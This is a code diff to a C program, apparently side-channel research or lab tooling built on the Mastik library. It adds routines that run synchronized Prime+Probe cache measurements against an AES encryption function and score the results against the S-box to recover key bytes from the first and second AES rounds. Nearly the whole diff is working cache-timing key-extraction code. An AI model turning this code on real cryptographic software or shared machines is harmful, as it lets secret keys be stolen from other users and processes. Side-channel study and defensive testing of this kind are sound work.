@@ -2,6 +2,7 @@
 #include "mastik/synctrace.h"
 
 #include <stdlib.h>
+#include <string.h>
 
 // ================== Parameters =================
 
@@ -11,7 +12,8 @@ static unsigned CACHE_LEVEL			= 1;
 
 // ================== Forward Declarations =================
 
-static void analyze(int64_t avg[256][1024], int *key, int *offset);
+static void analyze_r1(int64_t avg[256][1024], uint8_t *key);
+static void analyze_r2(int64_t avg[256][1024], uint8_t *key);
 
 // ================= Public Interface =================
 
@@ -21,7 +23,29 @@ void pp_init(unsigned cache_sets, unsigned cache_line_shift, unsigned cache_leve
 	CACHE_LEVEL = cache_level;
 }
 
-uint8_t pp(crypto_fn crypto, void *data, unsigned samples, unsigned idx) {
+uint8_t* pp_r1(crypto_fn crypto, void *data, unsigned samples) {
+	static uint8_t key[16] = {};
+	
+	st_clusters_t clusters = syncPrimeProbe(samples,
+											16,
+											1,
+											NULL,
+											NULL,
+											crypto,
+											data,
+											0xF0,
+											CACHE_LEVEL);
+	
+	memset(key, 0, sizeof(key));
+	for (int i = 0; i < 16; i++) {
+		analyze_r1(clusters[i].avg, &key[i]);
+	}
+
+	free(clusters);
+	return key;
+}
+
+uint8_t pp_r2(crypto_fn crypto, void *data, unsigned samples, unsigned idx) {
 	uint8_t fixmask[16] = {};
 	uint8_t fixdata[16] = {};
 
@@ -42,8 +66,8 @@ uint8_t pp(crypto_fn crypto, void *data, unsigned samples, unsigned idx) {
 											0xff,
 											CACHE_LEVEL);
 	
-	int key, offset;
-	analyze(clusters[idx].avg, &key, &offset);
+	uint8_t key = 0;
+	analyze_r2(clusters[idx].avg, &key);
 
     free(clusters);
     return key;
@@ -70,10 +94,31 @@ static const uint8_t sbox[256] = {
     0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
 };
 
-static void analyze(int64_t avg[256][1024], int *key, int *offset) {
+static void analyze_r1(int64_t avg[256][1024], uint8_t *key) {
+	int64_t max = INT64_MIN;
+
+	for (int guess = 0; guess < 16; guess++) {
+		for (int off = 0; off < L1_SETS; off++) {
+			int64_t sum = 0LL;
+
+			for (int pt = 0; pt < 16; pt++) {
+				int set = (off + (pt ^ guess)) % L1_SETS;
+				sum += avg[pt << 4][set];
+			}
+
+			if (sum > max) {
+				max = sum;
+				*key = guess;
+				// *offset = off;
+			}
+		}
+	}
+}
+
+static void analyze_r2(int64_t avg[256][1024], uint8_t *key) {
     int64_t best_score = -1;
     int best_key = 0;
-    int best_offset = 0;
+    // int best_offset = 0;
 
     for (unsigned kg = 0; kg < 256; ++kg) {
         for (unsigned off = 0; off < CACHE_SETS; ++off) {
@@ -88,11 +133,11 @@ static void analyze(int64_t avg[256][1024], int *key, int *offset) {
             if (score > best_score) {
                 best_score = score;
                 best_key = kg;
-                best_offset = off;
+                // best_offset = off;
             }
         }
     }
 
     *key = best_key;
-    *offset = best_offset;
+    // *offset = best_offset;
 }
